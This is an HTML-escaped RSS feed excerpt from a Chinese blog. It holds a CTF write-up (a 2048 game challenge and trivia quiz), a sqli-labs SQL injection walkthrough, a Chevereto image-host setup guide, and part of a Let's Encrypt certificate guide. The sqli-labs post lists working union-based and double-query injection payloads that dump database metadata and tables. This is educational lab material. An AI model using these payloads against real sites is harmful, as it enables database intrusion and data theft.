&lt;/h3&gt;&lt;p&gt;​ 打开题目是一个&lt;code&gt;2048&lt;/code&gt;的小游戏，第一个想法就是玩&lt;code&gt;2048&lt;/code&gt;达到一定分数以后会获得flag（&lt;del&gt;可恶这个比赛怎么知道最近我天天在玩2048的&lt;/del&gt;）,但是想比赛不可能让选手在线玩游戏吧，尤其对于我这种&lt;del&gt;逃课废物&lt;/del&gt;是不可能努力哒！&lt;/p&gt;
&lt;p&gt;F12开始翻网页资源&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/01/BwUONF.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;​ 还好上次&lt;del&gt;摸鱼&lt;/del&gt;课题做了一个网页版的2048，略微能看懂一点点结构，第一个&lt;code&gt;animframe_polyfill&lt;/code&gt;应该就是管动画效果的，&lt;code&gt;keynpard...&lt;/code&gt;这个肯定是相应按键的，&lt;code&gt;local_storage_manager&lt;/code&gt;应该是保存游戏的，&lt;code&gt;game_manager&lt;/code&gt;感觉就是管理整个游戏的主要文件。&lt;/p&gt;
&lt;p&gt;​ 打开&lt;code&gt;game_manager&lt;/code&gt;粗略的看了下变量，&lt;code&gt;score&lt;/code&gt; 分数、&lt;code&gt;over、won、keepPlaying&lt;/code&gt;游戏状态，想赢游戏肯定是和&lt;code&gt;score、won&lt;/code&gt;有关，直接Ctrl+F搜索整个文档这两个变量出现的位置。&lt;/p&gt;
&lt;p&gt;发现了&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/01/BwdGdK.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;​ 只有这里修改了&lt;code&gt;won&lt;/code&gt;的状态，前面还有个&lt;code&gt;16384&lt;/code&gt;这个应该就是获得胜利需要得到的分数，这个分数对于我来说还是简简单单（&lt;del&gt;小声bb&lt;/del&gt;&lt;a class="link" href="https://s1.ax1x.com/2020/11/01/BwUdte.jpg" target="_blank" rel="noopener"
&gt;截图为证&lt;/a&gt;），直接让&lt;code&gt;if&lt;/code&gt;里面的语句为真就可以获胜，直接修改&lt;code&gt;if(1) self.won = true&lt;/code&gt;，保存文件，按一个方向键让语句执行到，完工。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/01/BwwpTK.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;h1 id="general"&gt;general
&lt;/h1&gt;&lt;h3 id="猫咪问题"&gt;猫咪问题++
&lt;/h3&gt;&lt;p&gt;​ 秉着前面题都是简单题，试着做了一下，看到题目提示的有往年的问题题解&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/01/BwLtDs.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;​ 题意思很明显的书考验同学的搜题技巧。那就开工。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/01/BwLD8U.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;h4 id="第一题"&gt;第一题
&lt;/h4&gt;&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;以下编程语言、软件或组织对应标志是哺乳动物的有几个？&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.&lt;/p&gt;
&lt;p&gt;提示：学术上一般认为龙不属于哺乳动物。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;​ 本人只认识几个，那就一个一个搜呗。我的模式是：百度&lt;code&gt;xxx标志&lt;/code&gt;然后第二条就是百度图片的搜索结果，大致辨别一下，然后再百度&lt;code&gt;xxx是哺乳动物吗&lt;/code&gt;，妥妥的&lt;del&gt;胎儿&lt;/del&gt;教学。&lt;/p&gt;
&lt;p&gt;​ 一个比较有印象就是&lt;code&gt;FreeDOS&lt;/code&gt;这个标志就离谱，什么玩意&lt;/p&gt;
&lt;p&gt;&lt;img src="https://src.onlinedown.net/supply/sup_logo/logo-1122/46778_g.jpg"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;参考答案 ：12&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id="第二题"&gt;第二题
&lt;/h4&gt;&lt;blockquote&gt;
&lt;ol start="2"&gt;
&lt;li&gt;第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？&lt;/li&gt;
&lt;/ol&gt;&lt;/blockquote&gt;
&lt;p&gt;​ 卡了我好一会，没听过信鸽传输，贴上最后找到答案的&lt;a class="link" href="https://blog.csdn.net/qq_31621387/article/details/77690642" target="_blank" rel="noopener"
&gt;博客&lt;/a&gt;，以及一篇信鸽传输的&lt;a class="link" href="http://sohu.com/a/309403082_354973" target="_blank" rel="noopener"
&gt;历史发展&lt;/a&gt;，长见识了。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;参考答案：256&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id="第三题"&gt;第三题
&lt;/h4&gt;&lt;blockquote&gt;
&lt;ol start="3"&gt;
&lt;li&gt;USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;提示：活动记录会在哪里？&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;​ 搜索&lt;code&gt;USTC Linux 用户协会&lt;/code&gt;发现这个协会就是科大爱好者们创建的。那么直接摸到他们官网的&lt;a class="link" href="https://lug.ustc.edu.cn/news/" target="_blank" rel="noopener"
&gt;新闻版块&lt;/a&gt;（百度搜出来的是旧站，里面有新站的网址）。题目中还写道&lt;code&gt;2019年9月21日自由软件日活动&lt;/code&gt;，那么官网肯定有那天的新闻。&lt;/p&gt;
&lt;p&gt;​ 找到一篇当天的新闻&lt;a class="link" href="https://lug.ustc.edu.cn/news/2019/09/2019-sfd-ustc/" target="_blank" rel="noopener"
&gt;2019 软件自由日中国科大站&lt;/a&gt;，进取直接找，文章末尾有&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;最后一项是李文睿同学介绍了开源游戏 Teeworlds，由于底层代码开源，开发者可以做出自己的定制，可玩性非常高。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;​ 答案就是&lt;code&gt;Teeworlds&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;​ 我还摸到了他们当天活动的记录资料：&lt;a class="link" href="https://ftp.lug.ustc.edu.cn/%E6%B4%BB%E5%8A%A8/2019.09.21_SFD/" target="_blank" rel="noopener"
&gt;点我&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;​ 在&lt;code&gt;slides\闪电演讲\Teeworlds&lt;/code&gt;文件夹下有应该作者演讲的PPT和游戏的视频演示，有点心动了🤣&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;参考答案：9&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id="第四题"&gt;第四题
&lt;/h4&gt;&lt;blockquote&gt;
&lt;ol start="4"&gt;
&lt;li&gt;中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？&lt;/li&gt;
&lt;/ol&gt;&lt;/blockquote&gt;
&lt;p&gt;​ 直接百度地图搜图书馆，然后全景地图房门口，视野拉到L型灌木那。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/01/BwvkdA.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;参考答案：9&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id="第五题"&gt;第五题
&lt;/h4&gt;&lt;blockquote&gt;
&lt;ol start="5"&gt;
&lt;li&gt;中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？&lt;/li&gt;
&lt;/ol&gt;&lt;/blockquote&gt;
&lt;p&gt;​ 百度&lt;code&gt;中国科学技术大学第六届信息安全大赛&lt;/code&gt;有个&lt;code&gt;...圆满结束&lt;/code&gt;，就他了。点开第二行就是&lt;code&gt;经统计，在本次比赛中，总共有 2682 人注册，1904 人至少完成了一题。比赛期间所有人合计提交了 17098 次 flag&lt;/code&gt;。（看这个网站的标志似乎还是第三题搜的那个&lt;code&gt;USTC Linux 用户协会&lt;/code&gt;的官网新闻。嗷原来题目上已经说了是举办方👀）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;参考答案：17098&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;完工。&lt;/p&gt;</description></item><item><title>sql-labs(一)</title><link>https://www.braindance.top/posts/ctf/sql-labs1/</link><pubDate>Tue, 22 Sep 2020 10:50:08 +0000</pubDate><guid>https://www.braindance.top/posts/ctf/sql-labs1/</guid><description>&lt;h2 id="前言"&gt;前言
&lt;/h2&gt;&lt;p&gt;在线靶机地址：https://buuoj.cn/challenges#sqli-labs&lt;/p&gt;
&lt;h2 id="less-1"&gt;less-1
&lt;/h2&gt;&lt;p&gt;​ 首先说明sql注入的大致步骤：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;判断注入类型。如整型字符型注入等。&lt;/li&gt;
&lt;li&gt;判断列数&lt;/li&gt;
&lt;li&gt;判断数据的回显位&lt;/li&gt;
&lt;li&gt;构造sql语句&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;​ 根据题目提示，说明是一个单引号注入题目，构造一个带单引号的语句&lt;code&gt;?id=1'&lt;/code&gt;，发现数据库报错&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/04/BgERNd.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;​ 通过后面的报错语句&lt;code&gt;1'' LIMIT 0,1&lt;/code&gt;的分析，我们的单引号被数据库解析，那么说明我们也可以使用连接查询&lt;code&gt;union&lt;/code&gt;插入我们想要查询的语句。&lt;/p&gt;
&lt;p&gt;​ 推出数据库的查询的部分语句可能为&lt;code&gt;where id = '$id'LIMIT 0,1&lt;/code&gt;，那么通过构造闭合&lt;code&gt;?id=1' [这里添加语句] --+&lt;/code&gt;添加自己想要语句，语句后面的&lt;code&gt;--+&lt;/code&gt;作用是将后面的其他语句注释掉。&lt;/p&gt;
&lt;p&gt;​ 首先是判断字段个数：&lt;code&gt;?id=1' order by 1 --+&lt;/code&gt;，页面显示正常，直到尝试&lt;code&gt;?id=1' order by 4 --+&lt;/code&gt;发现数据库报错&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/04/BgVsGn.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;​ 说明数据库的字段值只有四个。&lt;/p&gt;
&lt;p&gt;​ 接下来测试数据的回显位，构造语句&lt;code&gt;?id=' union select 1,2,3 --+&lt;/code&gt;，这里需要注意的有，前面&lt;code&gt;id&lt;/code&gt;的查询一定是要不存在的，因为数据库只会回显第一条查询的数据，如果第一条语句查询成功则后面&lt;code&gt;union&lt;/code&gt;构造的语句就不会显示；&lt;code&gt;union&lt;/code&gt;连接查询语句后面查询的字段数需要和前面的字段数相等，详细用法可以自行查询。&lt;/p&gt;
&lt;p&gt;​ 执行后页面显示。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/04/BgZAeS.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;​ 说明查询语句的&lt;code&gt;2,3&lt;/code&gt;是回显位，之后就可以将查询的语句进行替换。如：&lt;/p&gt;
&lt;p&gt;​ 获取数据库版本，数据库路径，当前用户，当前数据库：
​ &lt;code&gt;?id=' union select 1,concat_ws('_',user(),version(),database()),@@basedir --+&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;页面显示&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/04/BgZbfs.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;​ 利用元数据库来爆表、爆数据&lt;/p&gt;
&lt;p&gt;​ &lt;code&gt;?id=' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;​ 之后大家可以自行发挥。&lt;/p&gt;
&lt;p&gt;​ &lt;code&gt;flag&lt;/code&gt;的话我做的题是在&lt;code&gt;ctftraining.flag&lt;/code&gt;表中，答案在：&lt;code&gt;?id=' union select 1,flag,3 from ctftraining.flag --+&lt;/code&gt;&lt;/p&gt;
&lt;h2 id="less-2"&gt;less-2
&lt;/h2&gt;&lt;p&gt;​ 第二题看题目名称&lt;code&gt;intiger based&lt;/code&gt;知大意，是id的数据类型由字符型变成了数字类型，这次就不使用单引号直接构造语句，和第一题差不多。&lt;/p&gt;
&lt;h2 id="less-3"&gt;less-3
&lt;/h2&gt;&lt;p&gt;​ 看标题&lt;code&gt;Single quotes with twist&lt;/code&gt;，是在前面题的基础上加上了括号包裹，所以语句就成了&lt;code&gt;where id = ('id')&lt;/code&gt;所以我们闭合的方式也要改变。附源码&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/04/BgnO1A.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;h2 id="less-4"&gt;less-4
&lt;/h2&gt;&lt;p&gt;​ 标题&lt;code&gt;Double Quotes&lt;/code&gt;，说明是个引号注入，把前面题的单引号改成双引号构成闭合即可。&lt;/p&gt;
&lt;h2 id="less-5"&gt;less-5
&lt;/h2&gt;&lt;p&gt;​ 标题&lt;code&gt;Double Injection-Single Quotes&lt;/code&gt;，很明显提示是单引号，然后套用前面的方法， 发现这次题目变了，不管输入啥页面只显示一个&lt;code&gt;You are in...........&lt;/code&gt;，但是数据库报错还是会显示，只要数据库错误还能显示，我们就可以是用一个新的技术把数据显示在错误信息上。&lt;/p&gt;
&lt;p&gt;​ 双查询注入也是我第一次听，贴一个讲大致原理的帖子：&lt;a class="link" href="https://blog.csdn.net/Leep0rt/article/details/78556440" target="_blank" rel="noopener"
&gt;点我&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;​ 构造语句：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;?id=' union select 1,2,3 from (select 1,count(*),concat_ws('____________',floor(rand()*2),concat_ws('********',version(),database()))a from information_schema.tables group by a)b --+&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;​ 讲一下&lt;code&gt;CONCAT_WS(separator,str1,str2,…)&lt;/code&gt;函数的用法：把&lt;code&gt;str1&lt;/code&gt;、&lt;code&gt;str2&lt;/code&gt;连接起来，并使用&lt;code&gt;separator&lt;/code&gt;做分隔符。&lt;/p&gt;</description></item><item><title>Chevereto-搭建一个自己的图床</title><link>https://www.braindance.top/posts/play_time/chevereto-%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9B%BE%E5%BA%8A/</link><pubDate>Sun, 20 Sep 2020 11:09:02 +0000</pubDate><guid>https://www.braindance.top/posts/play_time/chevereto-%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9B%BE%E5%BA%8A/</guid><description>&lt;p&gt;博客搭完了，自己选择的这个博客主题又是以图片为主要元素的，当然要考虑图片的使用问题了，原来打算直接放在服务器上，但是后来想了想，以后如果文章&lt;del&gt;越写越多&lt;/del&gt;用的图太多服务器的流量也不够用，想到了图床这一托管图片的服务，但是放在别人的上面总怕会受到&lt;del&gt;限制&lt;/del&gt;，正好发现了&lt;code&gt;Chevereto&lt;/code&gt;这一图床系统，可以自己搭建一个图床服务器，正好自己还有一个阿里云学生云，那就开工。&lt;/p&gt;
&lt;h3 id="chevereto-说明"&gt;Chevereto 说明
&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;Chevereto是一个可以帮助你建立自己的图像分享网站（图床）的应用程序，我们的目标是可以让世界上的任何一个人都可以建立自己的图像共享平台。我们坚定不移的为那些想要可定制的白标图像共享服务的人建立一个真正的替代品。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;Chevereto&lt;/code&gt;分为免费版和付费版，区别肯定就是大小什么的，我这个搭在学生云上肯定就不用想我会选择哪个了吧🤣&lt;/p&gt;
&lt;h3 id="环境说明"&gt;环境说明
&lt;/h3&gt;&lt;p&gt;因为&lt;code&gt;Chevereto&lt;/code&gt;所需要的环境为&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Apache/Nginx&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;PHP 5.5+&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;MySQL 5.0+&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;del&gt;我太懒了不想动&lt;/del&gt;所以我选择使用宝塔面板为我们搭建web环境。&lt;/p&gt;
&lt;p&gt;宝塔面板官网：https://www.bt.cn/&lt;/p&gt;
&lt;p&gt;安装完成以后进入管理面板应该会直接提示你安装需要的环境&lt;/p&gt;
&lt;p&gt;我的环境如下图&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/10/29/BJ9TVP.png"
loading="lazy"
alt="BJ9TVP.png"
&gt;&lt;/p&gt;
&lt;h3 id="总结安装步骤"&gt;总结安装步骤
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;去github下载Chevereto的压缩包。&lt;/li&gt;
&lt;li&gt;在宝塔面板上新建网站目录，创建一个存图片的数据库(自行创建)。&lt;/li&gt;
&lt;li&gt;将Chevereto的压缩包上传到网站目录解压。&lt;/li&gt;
&lt;li&gt;访问新建的网站就是Chevereto的管理面板，并进行初始配置。&lt;/li&gt;
&lt;li&gt;无了。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id="开始"&gt;开始
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a class="link" href="https://github.com/Chevereto/Chevereto-Free/releases" target="_blank" rel="noopener"
&gt;github下载地址&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;创建网站目录和数据库用户&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/10/29/BJ9H58.png"
loading="lazy"
alt="BJ9H58.png"
&gt;&lt;/p&gt;
&lt;p&gt;因为我域名所以域名留空，提示默认使用&lt;code&gt;80&lt;/code&gt;端口，访问地址就是服务器ip地址，剩下的自己随机发挥。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;创建完成后需要配置一下网站配置文件才可以访问到配置页面。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/10/29/BJ9Ibt.png"
loading="lazy"
alt="BJ9Ibt.png"
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/10/29/BJ9qPS.png"
loading="lazy"
alt="BJ9qPS.png"
&gt;&lt;/p&gt;
&lt;p&gt;在&lt;code&gt;server{...}&lt;/code&gt;中添加&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-nginx" data-lang="nginx"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;location&lt;/span&gt; &lt;span style="color:#e6db74"&gt;/&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;try_files&lt;/span&gt; $uri $uri/ &lt;span style="color:#e6db74"&gt;/index.php?&lt;/span&gt;$query_string;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;配置完成以后应该会自动保存并重启&lt;code&gt;Nginx&lt;/code&gt;。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;将在github上下载的&lt;code&gt;Chevereto&lt;/code&gt;压缩包上传到刚刚创建的网站目录中（上图是&lt;code&gt;/www/wwwroot&lt;/code&gt;）并解压。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;之后就可以直接访问&lt;code&gt;服务器ip:80&lt;/code&gt;（80端口可以省略），然后一步一步的进行配置。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;可能会出现的错误&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Chevereto can’t create the app/settings.php file. You must manually create this file&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;解决方法：这个错误就是没有找到&lt;code&gt;setting.php&lt;/code&gt;配置文件，压缩包内似乎没有创建该文件，我们可以自行创建，在&lt;code&gt;Chevereto&lt;/code&gt;的网站目录下的&lt;code&gt;/app&lt;/code&gt;目录下执行命令创建文件，并修改文件权限&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;touch settings.php
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;chmod +x settings.php
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;我自己还遇到了第二个错误，大概的意思就是访问权限不足blahbalhblahbla，我改了好久都不行。最后直接把整个网站目录的权限给改了访问成功。知道这样做不对，希望大佬能指点。&lt;/p&gt;&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;访问网站进行网站的初始化配置，大概就是填写数据库名称、数据库账号密码、管理员的账户和密码和一些信息。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/10/29/BJ97Uf.jpg"
loading="lazy"
alt="BJ97Uf.jpg"
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/10/29/BJ9O2Q.jpg"
loading="lazy"
alt="BJ9O2Q.jpg"
&gt;&lt;/p&gt;
&lt;p&gt;完成以后就可以登陆管理员账号进入管理面板，我是首先去设置里找到语言设置把面板改成了中文。&lt;/p&gt;
&lt;h3 id="完工"&gt;完工
&lt;/h3&gt;&lt;p&gt;管理面板还有好多其他功能，我都还没研究过，大伙可以以后可以自己慢慢学习&lt;/p&gt;
&lt;p&gt;然后我的图床地址：http://47.97.231.10/ (已失效) &lt;del&gt;🈚👇👻来丶se兔&lt;/del&gt;&lt;/p&gt;</description></item><item><title>Let_s_Encrypt 免费Https证书</title><link>https://www.braindance.top/posts/play_time/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/</link><pubDate>Thu, 03 Sep 2020 15:30:37 +0000</pubDate><guid>https://www.braindance.top/posts/play_time/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/</guid><description>&lt;p&gt;参考文章:&lt;a class="link" href="https://imququ.com/post/letsencrypt-certificate.html" target="_blank" rel="noopener"
&gt;Let&amp;rsquo;s Encrypt，免费好用的 HTTPS 证书&lt;/a&gt;&lt;/p&gt;
&lt;h3 id="先放官网"&gt;先放官网
&lt;/h3&gt;&lt;p&gt;&lt;a class="link" href="https://letsencrypt.org/" target="_blank" rel="noopener"
&gt;Let&amp;rsquo;s Encrypt&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a class="link" href="https://letsencrypt.org/" target="_blank" rel="noopener"
&gt;Let&amp;rsquo;s Encrypt&lt;/a&gt; 是免费、自动化、开放的证书签发服务, 它得到了 Mozilla、Cisco、Akamai、Electronic Frontier Foundation 和 Chrome 等众多公司和机构的支持，发展十分迅猛&lt;/p&gt;&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h4 id="所需环境"&gt;所需环境
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;一个 HTTP 服务，以 Nginx 为例&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;python&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;两个目录:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;/site 网站目录&lt;/p&gt;
&lt;p&gt;/site_site_cert 保存证书的目录&lt;/p&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;证书的颁发有两种方式：&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id="通过在线生成"&gt;通过在线生成
&lt;/h4&gt;&lt;p&gt;通过网址在线生成，需要验证文件&lt;/p&gt;
&lt;h4 id="通过程序生成"&gt;通过程序生成
&lt;/h4&gt;&lt;p&gt;通过本地 IIS，生成后会自动绑定本地 IIS 站点上的HTTPS 域名。&lt;/p&gt;
&lt;p&gt;我使用的是第一种方法：在线生成，原理是：先在你的服务器上传一个密钥，然后Let&amp;rsquo;s Encrypt会对网站进行访问，下载密钥进行验证。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id="开工"&gt;开工
&lt;/h3&gt;&lt;h3 id="创建账号"&gt;创建账号
&lt;/h3&gt;&lt;p&gt;首先创建一个目录，我是在根目录下创建文件夹site_cert&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;mkdir /site_cert
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个文件夹用来存放各种临时文件和最后的证书文件。进入这个目录，创建一个RSA私钥，用于Let&amp;rsquo;s Encrypt识别你的身份&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;openssl genrsa &lt;span style="color:#ae81ff"&gt;4096&lt;/span&gt; &amp;gt; account.key
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="创建csr文件"&gt;创建CSR文件
&lt;/h3&gt;&lt;p&gt;在这之前，还需要创建域名私钥（一定不要使用上面的账户私钥）&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;openssl genrsa &lt;span style="color:#ae81ff"&gt;4096&lt;/span&gt; &amp;gt; domain.key
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我参考的文章提到了两种私钥RSA和ECC，我现在也还不懂什么原理，把两种区别放出来吧&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;RSA 私钥：兼容性好&lt;/p&gt;
&lt;p&gt;ECC 私钥：部分老旧操作系统、浏览器不支持。优点是证书体积小&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;两个用于身份身份验证的私钥文件创建好，就可以生成CSR（Certificate Signing Request，证书签名请求）文件了，申请时可以把域名带 &lt;code&gt;www&lt;/code&gt; 和不带 &lt;code&gt;www&lt;/code&gt; 的两种情况都加进去，一张证书最多可以包含100个域名。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;openssl req -new -sha256 -key domain.key -subj &lt;span style="color:#e6db74"&gt;&amp;#34;/&amp;#34;&lt;/span&gt; -reqexts SAN -config &amp;lt;&lt;span style="color:#f92672"&gt;(&lt;/span&gt;cat /etc/ssl/openssl.cnf &amp;lt;&lt;span style="color:#f92672"&gt;(&lt;/span&gt;printf &lt;span style="color:#e6db74"&gt;&amp;#34;[SAN]\nsubjectAltName=DNS:yoursite.com,DNS:www.yoursite.com&amp;#34;&lt;/span&gt;&lt;span style="color:#f92672"&gt;))&lt;/span&gt; &amp;gt; domain.csr
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;其中DNS的&lt;code&gt;yoursite.com&lt;/code&gt;和&lt;code&gt;www.yoursite.com&lt;/code&gt;记得要换成自己的域名&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我在这里遇到了问题提示找不到&lt;code&gt;/etc/ssl/openssl.cnf&lt;/code&gt;文件，在网上找的的&lt;a class="link" href="https://blog.csdn.net/hjxdreamer/article/details/103296944" target="_blank" rel="noopener"
&gt;解决办法&lt;/a&gt;是&lt;/p&gt;
&lt;p&gt;执行 :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;openssl version -a
